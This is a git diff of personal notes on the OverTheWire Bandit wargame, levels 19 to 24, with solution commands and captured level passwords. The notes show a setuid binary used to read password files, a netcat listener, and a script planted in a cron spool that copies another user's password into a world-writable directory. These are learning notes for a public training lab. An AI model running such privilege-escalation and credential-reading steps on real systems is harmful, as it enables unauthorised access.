@@ -172,8 +172,8 @@ IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 
 lvl 19 --> lvl 20 : 
 ls -la // list long format including hidden files
-// Result : -rwsr-x---  1 bandit20 bandit19 7296 Oct 16 14:00 bandit20-do, the s at the beginning means that we bandit20 clearance to read the file as bandit19
-./bandit20-do id
+// Result : -rwsr-x---  1 bandit20 bandit19 7296 Oct 16 14:00 bandit20-do, the s at the beginning means that we need bandit20 clearance to read the file as bandit19
+./bandit20-do id 
 ./bandit20-do ls -la /etc/bandit_pass
 ./bandit20-do cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
@@ -181,7 +181,7 @@ GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 lvl 20 --> lvl 21 : 
 ls
 // Note : lvnp listen verbously noDNSresolution from port 
-nc -lvnp 35000 // Note open a connection through port 35000
+nc -lvnp 35000 // Note : open a connection through port 35000
 // on a new tab connect to bandit20
 // on the new tab ./suconnect 35000
 copy paste the password in the first tab and obtain new password
@@ -213,3 +213,26 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ssh -p 2220 bandit23@bandit.labs.overthewire.org
 
 lvl 23 --> lvl 24
+cd /etc/cron.d/
+ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+whoami
+myname=bandit24
+cd /var/spool/$myname
+which bash
+mkdir /tmp/rom
+chmod 777 /tmp/rom // read write exe for all users in that directory
+date
+nano get.sh 
+
+// inside nano 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rom/password.txt
+// 
+
+ls get.sh
+chmod +x get.sh
+cat /tmp/rom/password.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+ssh -p 2220 bandit24@bandit.labs.overthewire.org
